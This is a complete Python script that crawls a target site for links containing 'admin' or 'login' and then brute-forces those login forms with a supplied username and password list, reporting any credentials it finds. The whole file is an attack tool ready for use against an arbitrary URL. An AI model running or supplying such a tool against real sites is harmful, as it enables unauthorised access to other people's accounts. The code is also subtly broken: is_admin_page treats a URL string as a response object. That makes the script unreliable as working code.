import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def print_skull():
    print("\u2620", end=" ")

def is_admin_page(response):
    # Simple check for admin pages, you might want to add more conditions
    return "admin" in response.url.lower() or "login" in response.url.lower()

def brute_force_login(session, url, username, password_list):
    for password in password_list:
        data = {"username": username, "password": password}
        response = session.post(url, data=data)
        if "Welcome" in response.text or "Dashboard" in response.text:
            print_skull()
            print(f"Found credentials: {username}:{password}")
            return True
    return False

def main(args):
    session = requests.Session()
    response = session.get(args.url)
    soup = BeautifulSoup(response.text, "html.parser")

    # Find all links on the page
    links = [urljoin(args.url, a["href"]) for a in soup.find_all("a", href=True)]

    # Filter out admin pages and perform brute force
    for link in links:
        if is_admin_page(link):
            print_skull()
            print(f"Found potential admin page: {link}")
            if args.username:
                if brute_force_login(session, link, args.username, args.password_list):
                    break
            else:
                print(f"No username provided, skipping {link}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple web scanner for admin pages and brute force login")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--username", help="Username to use for brute force")
    parser.add_argument("--password-list", nargs="+", help="List of passwords to try")
    args = parser.parse_args()

    main(args)
